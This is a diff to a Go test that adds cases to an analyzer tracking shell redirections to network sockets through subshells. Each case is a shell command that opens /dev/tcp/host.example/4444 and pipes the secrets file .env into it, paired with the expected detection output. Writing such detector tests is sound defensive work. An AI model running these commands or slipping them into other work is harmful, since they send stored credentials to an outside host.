@@ -35,6 +35,11 @@ func TestSocketRedirects(t *testing.T) {
 		// A subshell uses what the shell that started it has open, and what it opens itself.
 		{"exec 3<>/dev/tcp/host.example/4444; (cat .env >&3)", []string{"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
 		{"(exec 3>/dev/tcp/host.example/4444; cat .env >&3)", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"(exec 3<>/dev/tcp/host.example/4444; (cat .env >&3))", []string{"exec:readwrite:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{`(exec 3>/dev/tcp/host.example/4444; echo "$(cat .env >&3)")`, []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
+		{"(exec 3>/dev/tcp/host.example/4444); (cat .env >&3)", []string{"exec:write:/dev/tcp/host.example/4444"}},
+		// Closing it in an inner subshell closes it there only.
+		{"(exec 3>/dev/tcp/host.example/4444; (exec 3>&-; cat a >&3); cat b >&3)", []string{"exec:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
 		// A command's standard output goes where its compound statement sends it, or where a bare
 		// exec left it; a pipeline inside takes it from all but its last stage.
 		{"{ cat .env; } > /dev/tcp/host.example/4444", []string{"{}:write:/dev/tcp/host.example/4444", "cat:write:/dev/tcp/host.example/4444"}},
